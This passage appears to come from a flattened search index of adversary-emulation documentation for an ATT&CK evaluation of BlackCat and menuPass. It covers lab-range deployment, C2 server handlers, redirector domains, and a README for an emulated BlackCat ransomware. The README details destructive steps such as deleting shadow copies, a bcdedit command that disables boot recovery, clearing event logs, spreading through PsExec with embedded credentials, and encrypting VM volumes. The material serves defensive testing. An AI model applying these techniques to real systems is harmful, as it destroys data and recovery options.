shell,","Terraform,","Ansible","AWS CLI installed","Install","On Mac with Homebrew installed","Example:","On Linux, see Terraform and Ansible documentation","and common system administration concepts for Windows and Linux"]},{"l":"Deploy Infrastructure with Terraform","p":["Terraform is used to initialize the infrastructure."]},{"l":"Amazon Marketplace Subscriptions","p":["NOTE: You may be prompted to accept the Terms and subscribe for images used in the AWS Marketplace. If prompted, follow the URL provided in the terminal and click the Subscribe button. Once the process completes, re-run the Terraform plan and apply commands below."]},{"l":"Windows 11","p":["IMPORTANT: AWS does not currently provide a pre-built Windows 11 Amazon Machine Image (AMI), and the team is unable to share the image used for the evaluation. As a result, you will have to provide your own Windows 11 AMI for use in the environment. The following steps provide some general guidance on building your own Windows 11 AMI. Please review the Amazon and Microsoft terms of service to ensure you are compliant with all licensing guidelines.","Packer is used to automate the build of a Windows 11 VM from the installation image.","Packer uploads the virtual machine file to an AWS S3 bucket.","AWS VM Import to convert the VM to an AMI.","AWS provides additional documentation on importing a Windows 11 VM.","By default, the included configuration uses Windows Server 2022 for all Windows 11 desktop systems to provide a functional system. This is for convenience, however it is not guaranteed that the emulation plan will operate as intended on Windows Server 2022 in instances where Windows 11 is expected."]},{"l":"Deploy environment","p":["All systems have been deployed! They still have to be configured, however time to celebrate! \uD83C\uDF55 \uD83C\uDF8A \uD83C\uDF86","cp -a deploy.auto.tfvars.template deploy.auto.tfvars","Create a Terraform settings file from the included template.","Edit the backend.tf file:","Edit the deploy.auto.tfvars file:","Execute the Terraform plan created in the previous step.","Generate VPN profiles.","IMPORTANT: The value must be a string. You cannot use a variable in this section, you must hardcode the bucket name.","Initialize your Terraform environment.","NOTE: This step may take a 15-30 minutes to properly provision all resources. This is normal.","Open the deploy.auto.tfvars in an editor, and configure with desired values.","Plan your deployment with Terraform.","Run make create-vpn-profiles to create OpenVPN profiles to connect to the infrastructure you just deployed.","Set the value to the name of the S3 bucket in the previous step.","terraform apply tfplan","terraform init","terraform plan --out=tfplan","terraform validate","The final profiles will be stored as .zip files in the publish/ subdirectory.","Time to run Terraform.","Towards the bottom of the file, uncomment the bucket variable in the terraform.backend.s3 section.","Uncomment the aws-bucket-name variable, and set to the name of the S3 bucket you would like to use for storing terraform state files. AWS S3 bucket names have to be unique and resolvable by DNS.","Validate your Terraform configuration."]},{"l":"Configure Infrastructure with Ansible","p":["For this round, all post deployment configuration was performed via Ansible.","Use one of the VPN profiles generated in the previous step. Any profile will work.","Use the Terraform Makefile to configure the Ansible deployment. The following command copies the SSH key to the Ansible setup directory with the proper permissions.","make ansible-setup","Change to Ansible base directory.","cd ../../ansible","Run Ansible configuration.","make configure-range-from-scratch","Wait. Ensure your provisioning host will not sleep or disconnect from the VPN during the provisioning step. Depending on bandwidth, the deployment could take 1-3 hours to fully configure all infrastructure."]},{"l":"Deploy Attack Platform Software","p":["Download the ATTACK Evaluations Library to the kraken and homelander(Kali Linux and Windows Jumpbox hosts). Follow the instructions to setup the red team tooling."]}],[{"i":"infrastructure-for-attck-evaluations---alphv-blackcat-and-menupass-2024","l":"Infrastructure for ATT&CK Evaluations - ALPHV BlackCat and menuPass (2024)","p":["The infrastructure below was used for both ALPHV BlackCat and menuPass (2024). For convenience and cost savings, shared resources are used, including supporting infrastructure, including attacker platform, DNS, mail server, and traffic forwarding hosts.","Initial infrastructure was setup using Terraform, with configuration applied via scripts and configuration files.","Infrastructure Overview","Scenario VMs","Subsidiary A Domain - digirunaway.net","Subsidiary B Domain - digirevenge.net","Standalone Workstation","Support and Red Team Hosts","Network Support Hosts","Red Team Hosts","Network Diagram"]},{"l":"Infrastructure Overview","p":["This document provides an overview of the infrastructure support used for the evaluation. In addition to setup and configuration of virtual machines, this document covers infrastructure support services, such as domain name services (DNS), mail, and traffic redirection, used to support the evaluation. Support services such as DNS and redirectors are used throughout the evaluation for resource efficiency.","The Digimon media franchise was used as inspiration for the naming scheme."]},{"l":"Scenario VMs","p":["The scenario consists of an organization with two subsidiaries, with a bidirectional Active Directory domain trust relationship between the domains. A separate workstation, outside of the two domains, represents a 3rd party user with trusted access to the domain systems."]},{"i":"subsidiary-a-domain---digirunawaynet","l":"Subsidiary A Domain - digirunaway.net","p":["10.10.10.200","10.10.10.4","10.10.10.9","10.10.20.11","10.10.20.22","10.10.20.23","cecilmon","Domain Controller","Exchange Server","gabumon","ghostmon","Hostname","IIS Server","IP","omnimon","OS","parrotmon","phantomon","Role","The Subsidiary A domain consists of six virtual machines, all joined to the digirunaway.net Windows domain.","Windows 11","Windows Server 2022","Workstation 1","Workstation 2","Workstation 3"]},{"i":"subsidiary-b-domain---digirevengenet","l":"Subsidiary B Domain - digirevenge.net","p":["10.20.10.122","10.20.10.16","10.20.10.200","10.20.10.23","10.20.10.4","10.20.20.11","10.20.20.22","10.20.20.33","alphamon","bakemon","blacknoirmon","butchermon","datamon","Domain Controller","Exchange Server","File Server","Hostname","IP","kimeramon","KVM Server (uses Active Directory credentials)","leomon","OS","Role","SQL Server","stormfrontmon","The Subsidiary B domain consists of eight virtual machines, all joined to the digirevenge.net Windows domain.","Ubuntu 22.04 LTS","Windows 11","Windows Server 2022","Workstation 1 (Bastion)","Workstation 2","Workstation 3"]},{"l":"Standalone Workstation","p":["The Standalone Workstation is a single virtual machine, not joined to an Active Directory domain.","Hostname","OS","IP","Role","raremon","Windows 11","10.30.10.4","Contractor Workstation"]},{"l":"Support and Red Team Hosts","p":["The following hosts are used for overall network support, as well as for red team use. The hosts below are not accessible by evaluation participants."]},{"l":"Network Support Hosts","p":["116.83.2.22","116.83.2.29","116.83.44.32, 116.83.2.91, 116.83.4.99","121.93.4.32, 121.93.66.4, 121.93.24.2","121.93.44.121, 121.93.99.100","deadpool","DNS","gambit","Hostname","IP","laura","OS","outofthewoods","Postfix Mail","Redirector 1","Redirector 2","Redirector 3","Role","sabertooth","Ubuntu 22.04 LTS"]},{"l":"Red Team Hosts","p":["Hostname","OS","IP","Role","homelander","Windows Server 2022","116.83.1.29","Jumpbox","kraken","Kali Linux 2023.4","176.59.1.18","Kali"]},{"l":"Network Diagram","p":["The diagram below shows the layout of all victim hosts, attack platform, and support hosts."]}],[{"l":"Traffic Redirectors","p":["Overview","Table of URLs and IPs used by Redirectors","Redirector-Specific Infrastructure Diagram","Redirector Logical Overview"]},{"l":"Overview","p":["Multiple redirectors are used to distribute the traffic across subnets and IP address ranges.","Traffic redirection is performed using iptables NAT masquerading, with traffic sent to specific destination IP address and port combinations being redirected to a specific IP address and port. Scripts in the ansible/playbooks/files/ folder provide the following functionality:","enable-traffic-forwarding-rules-redirect-[n].sh","Running the script on a server will configures network forwarding rules.","disable-traffic-forwarding-rules.sh","Running the script on a server will disable and clear any network forwarding rules in place.","print-traffic-forwarding-rules.sh","Running the script will print to stdout any network forwarding rules currently configured."]},{"l":"Table of URLs and IPs used by Redirectors","p":["116.83.2.91","116.83.4.99","116.83.44.32","121.93.24.2","121.93.4.32","121.93.44.121","121.93.66.4","121.93.99.100","139","20","21","22","445","4782","80","8080","8081","8082","Adversary HTTP Server","BlackCat","Destination Host/IP","Destination Port","FTP Redirector - ExMatter (Alternative Step)","gambit","hide-the-secret-password-inator[.]net","homelander","Inbound Redirection Domain","Inbound Redirection Source IP","Inbound Redirection Source Port","kraken","laura","luffaplex-dillpickle-inator[.]com","manhwajia[.]au","menuPass","notepad-plusplus-updates[.]com","notepad-plusplus-updates[.]eu","notepad-plusplus[.]eu","Notes","Quasar (Running on DC)","Quasar (Running on IIS)","Rclone WebDAV","Redirector Host","sabertooth","Scenario","SFTP Redirector - ExMatter","SMB Redirector","SodaMaster","TCP","TCP/UDP","ten-cent[.]us","the-inator[.]com"]},{"l":"Redirector-Specific Infrastructure Diagram"},{"l":"Redirector Logical Overview"}],[{"i":"attck-evaluations-control-server","l":"ATT&CK Evaluations Control Server","p":["This ATT&CK Evaluations Control Server is used to execute behaviors under test during ATT&CK Evaluations.","The Control Server provides features for generating implant stagers, controlling agents, and executing modules.","The Control Server is backed with a REST API to support automation and integration with other tools."]},{"l":"Usage","p":["This repository is meant to act as a submodule within other adversary emulation or ATT&CK evaluation repositories. To use this control server repository, you may either run the binary as is or reference the entire repository as a submodule.","The control server expects the following folder structure for payloads/uploads:","File uploads will be stored in the files subdirectory of the current working directory of the C2 server. The repository already has this directory available, but you will need to create the folder before running the binary from a different location.","Payload downloads will be fetched from the payloads folder of the parent directory of the C2 server's working location. The repository does not contain this payload directory, since the end user will be responsible for providing the payloads according to their specific use case. Ensure that this folder exists in the parent directory when running the C2 server. For example, if the control server is being run from the Resources/control_server directory, the payloads must be placed in Resources/payloads/ in order for the handlers to successfully serve them. Note that some handlers expect their payloads to be in a separate subdirectory under the payloads directory (e.g. Resources/payloads/handlername)","The control server is configured using two configuration YAML files - one for handler configuration and one for REST API configuration. By default, the control server will pull the REST API config from ./config/restAPI_config.yml. The handler configuration file is a required argument and must be provided using the -c or --config command-line flags. A sample handler configuration file is provided in ./config/sample_handler_config.yml as a reference only.","To change the REST API config path, use the -r or --rest-config command-line flags.","Example:"]},{"l":"Build from source","p":["To run with default REST API config path:","To specify REST API config path:"]},{"l":"Test Instructions","p":["Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by providing your own handler config YAML file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","See ./config/sample_handler_config.yml for an example YAML file structure.","Start the control server:","To run with default REST API config path:","To specify REST API config path:","Alternatively run directly from source:","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:"]},{"l":"Installation Dependencies","p":["Install Go version 1.15 or higher.","Run tests from the main repository directory. Go should automatically fetch needed dependencies.","Note: you may need to specify the full path to your golang binary if running under sudo.","For example:","Look at the go.mod file if you want to see the dependencies in detail."]},{"i":"attck-evaluations-c2-client","l":"ATT&CK Evaluations C2 Client","p":["This client is provided to interact with the C2 server via its REST API."]},{"l":"Build Instructions","p":["Install dependencies using pip3:"]},{"i":"test-instructions-1","l":"Test Instructions"},{"i":"usage-examples-1","l":"Usage Examples","p":["Enable C2 handlers and adjust configuration values to change IP address and ports to listen on by providing your own handler config YAML file. To enable a handler, set enabled to true, like below:","To disable a handler, set enabled to false, like below:","Start the control server:","To specify REST API config path:","Establish an implant session","Run an implant program of your choice to connect to the C2 (make sure that the corresponding handler was enabled).","Run the client python script to manage implant sessions.","For specific instructions on tasking a particular implant, reference the appropriate README."]}],[{"l":"Creating Your Own Handler","p":["The Evals C2 server is designed with customization in mind. Developers can easily add new handlers to the C2 server, and users can easily toggle which handlers to enable/disable and configure their settings. This guide describes how developers can add a new handler to the C2 server.","In this guide, we'll use an HTTP C2 handler as a basic example, and we'll call it examplehttphandler."]},{"l":"Add Your Handler Source Code","p":["Within the handlers folder, create a new folder for your C2 handler. In our case, we'll call it examplehttphandler. This folder will contain a Golang package for your C2 handler - all your handler source code and associated test files will go here.","We'll pretend that we created the following files for our demo C2 handler:","handlers/examplehttphandler/examplehttphandler.go","handlers/examplehttphandler/examplehttphandler_test.go"]},{"l":"Handler Init Function","p":["In one of your handler source code files, you will need to mark your C2 handler as an available handler in an init function. This way, when your handler package gets imported, the C2 server will know that your handler is available and where to reach it. You will also need to use a struct to represent your handler, as your handler will need to implement the util.Handler interface. The below code provides an example:","Note that we use a factory method to return our struct - this gives us more flexibility if we need to add more variables to our handler struct, and it allows easier handler creation in unit tests.","util.AvailableHandlers maps handler names ( string) to handler structs that implement the util.Handler interface. This means that our new handler must implement the util.Handler interface:","Since each handler may operate differently, we leave it up to the handler creaters to determine how to start and stop their handlers. The only requirements are the method signatures - both methods must return error if something goes wrong, and StartHandler must take in a string(the REST API server address) and a config.HandlerConfigEntry, which represents the handler config entry for our specific handler. You will not need to call these methods outside of your unit tests - main.go will handle that for you when starting up enabled C2 handlers.","For our HTTP handler, we can use StartHandler to listen on the address specified in our configuration entry (which we will create momentarily) and to serve URL paths of our choice. Feel free to reference other handler implementations to get an idea of how you can set up your C2 handler. StopHandler will take care of gracefully tearing down the handler components."]},{"l":"Register Our C2 Handler","p":["There are two steps for registering our C2 handler - creating a configuration entry and making sure our handler package gets imported."]},{"l":"Import Handler","p":["In order for the C2 server executable to incorporate our new handler code, we need to import the package so that the init function in our handler source code runs. We can do this by adding a new import statement in handler/handlers.go(change your package name accordingly):","The _ underscore in front of the import means that we're only importing the package for its side effects, in particular the init function. Remember that the init function is what stores our handler struct in the map of available handlers. handlers.go will not directly reference individual C2 handlers, so we can't use a typical import."]},{"l":"Config Entry","p":["The handler configuration YAML file contains the configuration entries for all of the available handlers in the C2 server. Each entry is a dictionary that maps the handler name to an inner dictionary that maps a configuration setting name to its value.","For example:","In the above example, the handler name is myhandler, and there are three configuration settings:","host- the IP address that the handler should bind to when listening for C2 traffic","port- the port that the handler should listen on","enabled: whether or not the handler should run when the C2 server starts up.","Since different handlers can use different protocols and methods for handling C2 traffic, you may see that some handlers have different settings in their config entries. The only one that is required is the enabled setting, since this tells the C2 server whether or not to run the handler.","When creating your own handler, think about what configuration settings it will need. If the C2 traffic will be over HTTP, perhaps you want to allow users to specify the host/port combination to listen on.","In this guide, we'll use an HTTP C2 handler as a basic example, and we'll call it examplehttphandler. Our config file entry will look as follows:","Note that we set enabled to true so that our handler will start up when the server is run. We'll simply create a file ./config/my_example_handler_config.yml and write those contents in it."]},{"l":"Unit Tests","p":["Don't forget your unit tests! You will need to create unit tests for your new handler and update existing unit tests in handler/handlers_test.go to account for your newly available C2 handler:","The TestStartStopHandlers and TestStartStopHandlersSomeEnabled test functions will need to be updated so that the number of available C2 handlers reflects your newly added handler.","The auxiliary functions mockHandlerConfigFileReaderAllEnabled and mockHandlerConfigFileReaderSomeEnabled will also need to be updated to include dummy entries for your new handler.","When ready, run go test ./... in the main control server repo directory to confirm that all your tests are working."]},{"l":"Recompile binary","p":["Recompile the control server binary to include your new C2 handler and perform any additional testing.","Run go build -o controlServer main.go in the main directory to recompile, and run sudo ./controlServer -c ./config/my_example_handler_config.yml to run the control server using your specific handler configuration settings."]}],[{"l":"Simple File Server","p":["The Simple File Server Handler allows file downloads and file uploads."]},{"l":"Features","p":["Supports file downloads via HTTP requests to endpoints specified in the handler configuration entry. Multiple URL prefixes are supported.","Supports downloading via curl, certutil.exe, bitsadmin","If no prefixes are provided in the configuration entry, the default will be to serve files from handlers/simplefileserver/files at URL prefix /files","Supports file uploads via HTTP POST request to the /uploads endpoint","Requires sending file content via POST body and file name via filename HTTP header","Prevents directory listing for file endpoints."]},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the Simple File Server handler within the control server, edit the corresponding handler config file within the config/ directory in the main C2 server repo. Create or adjust an existing handler entry as needed.","Example:","for each entry in mappings, prefix specifies the URL prefix for file requests, and dir specifies the path on disk to fetch files from. Subdirectories are automatically supported as long as they exist on disk. Do not add a / at the end of a prefix value.","Run the controlServer binary as sudo and look for success messages in starting up the Simple File Server handler:"]}],[{"l":"Golang Debugging Guide","p":["This guide is a quick overview on how to install and get started with the Golang debugger on VS Code."]},{"l":"Step 1","p":["You will first need to install the Go extension if you have not already. Click on the Extensions icon on the left pane of your window and search 'Go', the needed extension should be the first result. Once you have the Go extension installed, look to the bottom right of your screen on the status bar. If you see â ï¸ Analysis Tools Missing, click on the warning to download the necessary dependencies. If you do not have the warning displayed, you are set to move on to Step 2."]},{"l":"Step 2","p":["You will need to create a launch.json config file. Click on the Debug icon on the left pane of VS Code. You should see the following:","Screenshot 2023-06-27 at 2 42 18 PM","Click on the create a launch.json file link to generate the file. If your Debug panel does not give you this option, you can just create the file manually. Create a new directory entitled .vscode and new file launch.json within it."]},{"l":"Step 3","p":["Configure your launch.json file to reflect the following:","Make sure to update the program and args fields to correctly reflect your filepaths to main.go and your handler config file."]},{"l":"Step 4","p":["Set your breakpoints and then click the green play icon at the top of the Debug panel to start the debugger.","Congratulations! You are now ready to start debugging your Go programs!"]}],[{"l":"BlackCat"},{"l":"Introduction","p":["This ransomware emulates the BlackCat ransomware family, which is written in Rust and targets Windows and Linux 4, 2, 5. Its behavior changes depending on whether it is compiled as a Windows binary or as a Linux binary.","To make troubleshooting and testing easier, the debug-compiled version of the emulated BlackCat comes with cleanup options that will decrypt any encrypted files.","â Note: the publicly released version of this code does not contain the actual encryption functionality, so any encryption/decryption simply rewrites the original plaintext. Users will need to incorporate the encryption themselves."]},{"l":"Features","p":["Any excluded directories, filenames, or file extensions specified in the configuration will be skipped.","As an anti-sandboxing measure, BlackCat requires a valid access token to be passed via the --access-token argument 3, 6. For this emulated version, the provided access token must start with 15742aa362a84ba3.","Changes the wallpaper to a ransomware message image for all logged-in users (Windows only). 1","Checks if KVM is installed on the target machine by running virsh version","Clears Windows event logs (Windows only). 1","Deletes shadow copies before and after encrypting files (Windows only). 1, 2, 5","Determines if running as an elevated or unelevated user. 2","Disables bootloader recovery by executing bcdedit /set {default} recoveryenabled no. 2","Discovers current username and hostname 2","Discovers machine UUID by executing wmic csproduct get UUID(Windows) or by reading from the /sys/class/dmi/id/product_uuid(Linux, elevated) or /etc/machine-id(Linux, unelevated) files. 1","Empties the recycle bin if not already empty (Windows only). 1","Enables remote-to-local and remote-to-remote symbolic link evaluation using fsutil(Windows only). 1, 2, 5","Encrypted files will have the custom ransomware extension appended to the filename, and affected directories will have the ransom note dropped.","Encrypts VM volumes. Encrypted files will have the custom ransomware extension appended to the filename, and affected directories will have the ransom note dropped.","Enumerate local partitions and mounts those that don't have volume paths, as they may be hidden partitions (Windows only). This will allow the encryption process to target these partitions, potentially including the recovery partition. 1, 5","Enumerate VM volumes","Enumerates and deletes VM snapshots","Enumerates and shuts down all VMs on the KVM server","For Linux encryption, the ransomware will target VMs running on the target KVM server (KVM targeted instead of ESXi) 1, 4, 6:","For Windows encryption, the ransomware will stop processes and services that may interfere with encryption and then iterate through the file system and encrypt valid target files. 1, 3, 4, 5, 6 7","If a directory name is excluded, no child directories will be affected. For strict include directories, child directories will not be affected, either.","If the strict include directories configuration setting is set, BlackCat will only iterate through those directories. Otherwise, BlackCat will iterate through all valid directories, starting at the C:\\ root drive.","Increases the max number of concurrent network requests by setting the MaxMpxCt registry value to 65535 for the registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters to increase concurrent network requests 1, 2","Note that for execution purposes, the BlackCat configuration includes a strict_include_targets setting, which is a list of IP addresses that the ransomware is allowed to propagate to. Change these according to your specific environment if you want to control the propagation. Providing a blank entry for this configuration value will allow all discovered target hosts.","Partitions are mounted to randomly generated subdirectories of C:\\ so that they are included in the encryption routine.","Performs automated propagation to remote hosts on the local network (Windows only)","Performs NetBIOS lookups on the local netrange to find remote Windows targets. Will propagate to these targets by writing an embedded PsExec binary to disk as pmanager.exe in the user's temp directory, and then using it to execute itself remotely using embedded credentials in the config 1, 2, 5","Sets up threadpools for encryption (Linux/Windows) and for network scanning (Windows-only). 1","Stops libvirtd service to prevent potential interference with encryption","Stops libvirtd, virsh, libvirt-dbus processes to prevent potential interference with encryption","The image is saved in each user's desktop folder ( C:\\\\Users\\\\USERNAME\\\\Desktop\\\\RECOVER-SKYFL2E-FILES.txt.png), and registry updates are made to change the wallpaper accordingly 1. Since the HKEY_USERS registry hive is used to enumerate the target users, only users with active logon sessions will be affected. The default wallpaper is not changed.","The PsExec command executed is equivalent to the following:","To avoid endless propagation, any spawned BlackCat processes via PsExec will be run with the --no-prop flag, disabling any further propagation.","To hamper string-based detection in static analysis, string literals within the binary are encrypted at compile-time and are decrypted in memory at run-time.","Unmounts any partitions that were mounted earlier (Windows only)"]},{"l":"Ransomware Encryption","p":["When encrypting files, BlackCat uses AES-CTR-128, using the same randomly generated key for all files.","For small files (less than 128MB), the files are simply encrypted entirely.","For large files (over 128MB), a chunked encryption approach is used to avoid encrypting the entire file:","The file is broken up into chunks that are 1MB in size","For each 1MB chunk, the first 8KB are encrypted","The actual BlackCat ransomware has also used a chunking approach when encrypting large files. 3","â Note: the publicly released version of this code does not contain the actual encryption functionality, so any encryption/decryption simply rewrites the original plaintext. Users will need to incorporate the encryption themselves."]},{"l":"Configuration","p":["â Note: the publicly released version of this code only contains a base64-encoded configuration rather than an AES-encrypted configuration. Users will need to incorporate the encryption themselves.","Because the configuration settings are hardcoded in the source code, any adjustments will require recompilation, such as when enabling/disabling features, adjusting propagation credentials, or restricting where encryption and propagation occurs. Note that if you're only changing the JSON file, cargo build may only reference the previously cached build since actual source code hasn't changed. In that case, you can run cargo clean prior to re-running cargo build to force a fresh compilation.","Below is an example JSON configuration file:","BlackCat's settings are configured using the config.json JSON configuration file. The contents of this configuration file are AES-CTR-128 encrypted and then base64-encoded before being embedded in the executable during compilation. BlackCat uses the --access-token argument to decrypt the embedded configuration when executing 1, 3, 4","empty_recycle_bin- (Windows only) toggles emptying the recycle bin","enable_enc- toggles encryption of files (Windows) or VM disks (Linux).","enable_event_del- (Windows only) toggles deleting Windows event logs.","enable_hidden_partitions- (Windows only) toggles finding and mounting hidden partitions for encryption.","enable_network_discovery- (Windows only) toggle remote target discovery via NetBIOS 1.","enable_recovery_hampering- (Windows only) toggles deleting shadow copies and disabling bootloader recovery.\"enable_event_del\": true,\"enable_event_del\": true,","enable_self_propagation- (Windows only) toggle propagation via PsExec to discovered hosts (also requires enable_network_discovery to be enabled). 1","enable_set_wallpaper- (Windows only) toggle changing the wallpaper after encrypting files 1.","enable_vm_kill- (Linux only) toggles killing VMs on the target KVM server. 1","enable_vm_snapshot_kill- (Linux only) toggles deleting VM snapshots on the KVM server.","exclude_directory_names- (Windows only) directories to skip during encryption 1.","exclude_file_extensions- (Windows only) file extensions to skip during encryption 1.","exclude_file_names- (Windows only) file names to skip during encryption 1.","extension- specifies the custom file extension to append to encrypted files 1.","kill_processes_linux- (Linux only) processes to kill prior to encrypting VM volumes and disrupting VM operations.","kill_processes- (Windows only) processes to kill prior to encrypting files 1.","kill_services_linux- (Linux only) services to terminate prior to encrypting VM volumes and disrupting VM operations.","kill_services- (Windows only) services to terminate prior to encrypting files 1.","note_file_name- specifies the ransom note file name 1.","note_full_text- specifies the ransom note contents 1.","psexec_password- (Windows only) password to use for PsExec propagation.","psexec_username- (Windows only) username to use for PsExec propagation.","strict_include_paths- (Windows only) only encrypt files in these directories 1.","strict_include_scan_ranges- (Windows only) only scan the intersection of these ranges with the local ranges. Used to avoid scanning the entirety of large networks","strict_include_targets- (Windows only) only propagate to these target hosts if discovered.","The following settings are used:","unmount_hidden_partitions- (Windows only) toggles unmounting hidden partitions after encryption."]},{"l":"Troubleshooting and Logging","p":["â Note: the publicly released version of this code only logs in plaintext and will also output log lines to the console if run from there.","Below are some potential issues and how to address them:","BlackCat failed to propagate","BlackCat immediately terminates, no log file created","BlackCat will log each action taken and will provide success or error messages. The verbosity may vary depending on whether or not it was compiled for debug or release, but operators can search for any ERROR messages to look for things that went wrong.","Check the JSON configuration to make sure enable_network_discovery and enable_self_propagation are set to true and that the correct credentials are provided in psexec_username and psexec_password","Check the logs to make sure PsExec was dropped and executed properly","Check the logs to make sure the correct local network CIDR was used","Ensure the JSON configuration file in config/config.json has everything enabled that you want performed","Ensure you are running BlackCat under an elevated context and try again.","If strict_include_targets is set in the JSON configuration, make sure the values are what you expect. If a non-empty list is provided, BlackCat will only propagate to these hosts.","If the correct network was scanned, make sure the starting host can talk to other hosts on the network via NetBIOS, as this connection is required in order for the propagation target scan to succeed.","If the vendor didn't block the process, chances are the incorrect access token was provided, or none was provided at all via command-line. Check your command and try again.","Logging is provided for troubleshooting purposes and operator usability. Logs are written to clog.xtlog in the current working directory on Windows systems, and to bc.log in the current working directory on Linux systems.","Privileges are correct, but BlackCat still didn't perform certain actions","Several actions skipped due to lack of privileges"]},{"l":"Cleanup","p":["When compiled in debug mode, BlackCat comes with cleanup capabilities, which are enabled by using the --clean-up and --key arguments. Since BlackCat will generate a random AES key each time it is executed, you will have to go through the BlackCat logs on the affected hosts to determine the AES keys to use for cleanup. Pass the AES key in as a hex string for BlackCat to decrypt affected files.","The following cleanup tasks are performed:","Decrypt encrypted files","Remove ransom notes from affected directories","Note that registry changes, killed processes/services, wallpaper changes, deleted events, files deleted from the recycle bin, etc will not be restored."]},{"l":"Run","p":["BlackCat can be run via cargo or as a precompiled executable (see the Build section for build information).","Note that --access-token is required and must be at least 16 characters long. The first 16 characters are used to decrypt the configuration 3.","â WARNING - do not run BlackCat on any system that you do not want to tamper with. BlackCat will perform various recovery hampering and impact TTPs, including encrypting files, deleting shadow copies, and clearing windows event logs. Use and test with caution.","Via cargo:","As an executable:","The following command-line flags can override config settings or enable other features:","--prop- force propagation via PsExec.","--no-prop- force disable propagation via PsExec.","--clean-up- toggle cleanup mode. Requires the --key argument","--key- hex string containing the AES key used to encrypt files. Used with the --clean-up flag to decrypt encrypted files.","Examples:"]},{"l":"Build","p":["When compiled, binaries are automatically placed in ./target/[release|debug]/ for Windows and in ./target/x86_64-unknown-linux-musl/release for Linux (when using the x86_64-unknown-linux-musl target). Pre-compiled binaries are already available in ./executables.","When building in Linux for the first time, you will have to install the appropriate target:","For Debug builds:","For Release builds:","For best results, run the cargo build commands on a Linux machine when compiling a Linux version of BlackCat, and on a Windows machine when compiling a Windows version. Cross-compilation has not been fully tested."]},{"l":"Required Software","p":["Rust v1.70.0 or greater - Installed via rustup. Available from the official Rust website.","Windows installer Notes","Chocolatey ( choco install rustup.install), or Winget ( winget install Rustlang.Rustup) are also viable installers","Rustup installer should prompt you to install Visual C++ Build Tools but if not, you will need to install that too"]},{"l":"Windows","p":["Visual C++ Build Tools should be prompted to install when running rustup. If not, install independently.","To avoid vcruntime issues, the crt-static flag is passed to the compiler. This is already set in .cargo/config.toml"]},{"l":"Testing"},{"l":"Detonating In Test Environment","p":["Correct credentials for PsExec propagation","Correct IP addresses for strict_include_targets, if applicable","Correct paths for strict_include_paths, if applicable","Detonate and inspect logs to see what succeeded or failed.","Do I want encryption to happen?","Ensure any anti-virus products (e.g. Defender) are OFF in every machine in the test environment, even the ones you aren't planning to propagate to, just in case the propagation restriction feature has an unknown bug.","Ensure the BlackCat configuration is set correctly according to your environment and what you plan on testing","Ensure there are snapshots for the target machines that include all of the above, so you can revert after detonating BlackCat","Ensure there are VMs on the Linux KVM server","Features enabled/disabled as desired","If building to target the KVM server, you will need to build on a Linux machine, such as your Kali attacker machine","If building to target Windows, you will need to build on a Windows dev machine and then transfer to the target environment, e.g. via GitHub dev branch","If clearing the recycling bin, ensure there are files in the recycling bin on the target machines","If deleting shadow copies, ensure there are shadow copies on the target machines","If deleting VM snapshots, ensure that the VMs have snapshots to delete","If enabling encryption, ensure there are valid files to encrypt","If planning on terminating specific processes or services, ensure they are running on the target machines","If stopping VMs, ensure the VMs are running","If using strict_include_paths, ensure those paths have valid files to encrypt","Once everything is set, you will have to rebuild BlackCat and transfer it to your target machines","Perform the following checklist prior to detonating in a test environment:","When detonating the BlackCat ransomware in a test environment, the following considerations need to be taken into account:","Which machines do I want to propagate to? Just one or two for testing? Or every machine possible in the environment?"]},{"l":"Unit Tests","p":["Unit tests are currently written within the same .rs files as the code being tested. Note that the Windows and Linux variants have different unit tests.","To run Debug tests:","To run Release tests:"]},{"l":"Minimal Blackcat","p":["To support alternative steps, a minimal version of BlackCat was created that only performs encryption for Linux/Windows.","This source code was removed prior to public release."]},{"l":"Developer Notes"},{"l":"File and Directory Structure","p":["config/","config/config.json","config/unit_test_config.json","Configuration file specifically for unit tests. Do not edit unless adjusting configuration logic in source code or fixing unit tests.","contains a modified version of the nbtscanner Rust crate","contains basic discovery logic for current username and privilege level, current hostname, and machine UUID","contains BlackCat configuration logic and configuration-related auxiliary methods","contains logic to discover remote targets and propagate to them via PsExec","contains logic to find local IPs and netranges","contains logic to zlib-compress the PsExec64.exe binary","contains main cleanup logic for BlackCat's cleanup variant","contains resources and other helper files","contains the main high-level logic and argument parsing for BlackCat","Description","encryptliterals/","executables/","File/Directory","image used to replace user wallpapers after encrypting files","Production configuration file for BlackCat. Edit this to change actual BlackCat behavior.","provides AES encryption/decryption routines","provides custom macros to read in and AES-encrypt the JSON configuration and to XOR-encrypt string literals within source code","provides funcionality to terminate services","provides functionality to change the wallpaper on Windows targets","provides functionality to disable bootloader recovery and delete shadow copies","provides functionality to empty the recycling bin on Windows targets","provides functionality to execute and terminate processes","provides functionality to unzip the embedded PsExec binary, execute PsExec, and remove PsExec from disk","provides helper methods for using the winapi crate","provides helper methods for using the windows crate","provides JSON configuration files for BlackCat","provides logging functionality","provides logic to clear Windows event logs","provides logic to enumerate files and encrypt them on Windows targets","provides logic to perform ransomware tasks against Linux KVM servers (stop VMs, delete snapshots, encrypt VM volumes)","provides pre-compiled debug and release binaries","PsExec v2.43 binary downloaded from Microsoft","Python script that will decrypt the BlackCat log file","resources/","resources/decrypt_log.py","resources/PsExec64.exe","resources/psexec64.zip","resources/ransom_note.png","resources/zipper_util/","src/cleanup.rs","src/config.rs","src/discovery.rs","src/encrypt.rs","src/enumerate.rs","src/eventdel.rs","src/kvm.rs","src/latmove/local_ips.rs","src/latmove/nbtscan/","src/latmove/propagate.rs","src/logger.rs","src/main.rs","src/proc.rs","src/psexec.rs","src/recovery.rs","src/recycling.rs","src/service.rs","src/wallpaper.rs","src/winapi_helper.rs","src/windowscrate_helper.rs","zipped version of the PsExec v2.43 binary. Will be embedded in BlackCat binary on compilation"]},{"l":"Documentation","p":["Generate and open build docs by running cargo doc --open","Follow code documentation instructions here in order to add your own comments to the docs"]},{"l":"Rust Help","p":["Learning Rust? Start here. The official Rust book is an excellent resource and should be your first step.","rust-analyzer- A Language Server Protocol that provides useful features like auto-completion and type hints.","Packaged as a native VSCode Plugin(recommended)","Refer to the website for other supported editors and IDE's."]},{"l":"CTI 